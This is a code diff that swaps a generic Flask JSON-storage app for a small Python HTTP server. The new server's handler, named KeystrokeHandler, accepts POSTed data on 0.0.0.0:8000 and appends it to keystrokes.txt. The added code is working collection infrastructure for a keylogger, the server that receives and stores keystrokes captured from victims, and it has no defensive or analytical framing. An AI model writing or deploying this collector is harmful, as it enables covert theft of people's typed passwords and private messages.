@@ -1,51 +1,20 @@
-from flask import Flask, request, jsonify
-import os, json, time
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-app = Flask(__name__)
-DATA_FILE = "data.json"
+class KeystrokeHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        with open('keystrokes.txt', 'a') as f:
+            f.write(post_data.decode('utf-8') + '\n')
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Data received successfully')
 
-def load_all():
-    if not os.path.exists(DATA_FILE):
-        return []
-    try:
-        with open(DATA_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception:
-        return []
+def run(server_class=HTTPServer, handler_class=KeystrokeHandler):
+    server_address = ('0.0.0.0', 8000)
+    httpd = server_class(server_address, handler_class)
+    print('Starting httpd on port 8000')
+    httpd.serve_forever()
 
-def save_all(items):
-    with open(DATA_FILE, "w", encoding="utf-8") as f:
-        json.dump(items, f, ensure_ascii=False, indent=2)
-
-@app.get("/health")
-def health():
-    return jsonify({"ok": True, "time": int(time.time())})
-
-@app.post("/upload")
-def upload():
-    payload = request.get_json(silent=True)
-    if payload is None:
-        return jsonify({"ok": False, "error": "Send JSON body"}), 400
-
-    items = load_all()
-    record = {
-        "ts": int(time.time()),
-        "data": payload
-    }
-    items.append(record)
-    items = items[-200:]
-    save_all(items)
-
-    return jsonify({"ok": True, "saved": True})
-
-@app.get("/latest")
-def latest():
-    items = load_all()
-    return jsonify(items[-1] if items else {"empty": True})
-
-@app.get("/all")
-def all_data():
-    return jsonify(load_all())
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+if __name__ == '__main__':
+    run()
